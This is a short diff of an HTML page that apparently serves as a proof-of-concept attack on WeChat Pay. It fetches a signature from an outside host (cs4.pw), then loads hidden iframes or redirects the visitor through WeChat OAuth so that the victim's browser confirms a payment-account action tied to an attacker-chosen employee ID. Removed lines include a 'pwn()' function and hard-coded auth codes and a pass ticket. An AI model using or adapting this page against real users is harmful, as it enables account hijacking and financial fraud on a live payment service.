@@ -1,14 +1,8 @@
-<iframe id="x" width="1" height="1" onload="pwn()" src=''></iframe>
-<iframe id="y" width="1" height="1" src=''></iframe>
+<iframe id="x" width="1" height="1"  onload="" src=''></iframe>
 <script>
-sig=''
-fetch("https://1vpctucm.cs4.pw/paypay").then(res => res.text()).then(function(res){
-  x.src='https://pay.weixin.qq.com/index.php/apply/applyment_home/confirmQrcode?actionType=1&sign='+res+'&src=&code=081AHF000ytzaM1CiQ200VDz222AHF0D&state=';
-  sig=res;
+
+fetch("https://1vpctucm.cs4.pw/paypay2").then(res => res.text()).then(function(res){
+  location='https://open.weixin.qq.com/connect/oauth2/authorize?appid=wxb02461a9fc6cbb8c&redirect_uri=https%3A%2F%2Fpay.weixin.qq.com%2Findex.php%2Fcore%2Fwechat_login%2FconfirmQrcode%3FactionType%3D2%26sign%3D'+res+'%26employeeId%3D511744594&response_type=code&scope=snsapi_base&#wechat_redirect';
 }
 );
-function pwn()
-  {
-    location='https://pay.weixin.qq.com/index.php/apply/applyment_home/preConfirmQrcode?actionType=2&sign='+sig+'&src=&code=091AMO2w37OFNW27pC2w3hUkjP3AMO2T&state=&pass_ticket=pSnO4A%2FnyPBDOg5VFbLuLknU8yLS0WBQDyPCvOP%2BkoMjgdAHSGWo%2FbAUXWIKA2jL&employeeId=undefined';
-  }
 </script>
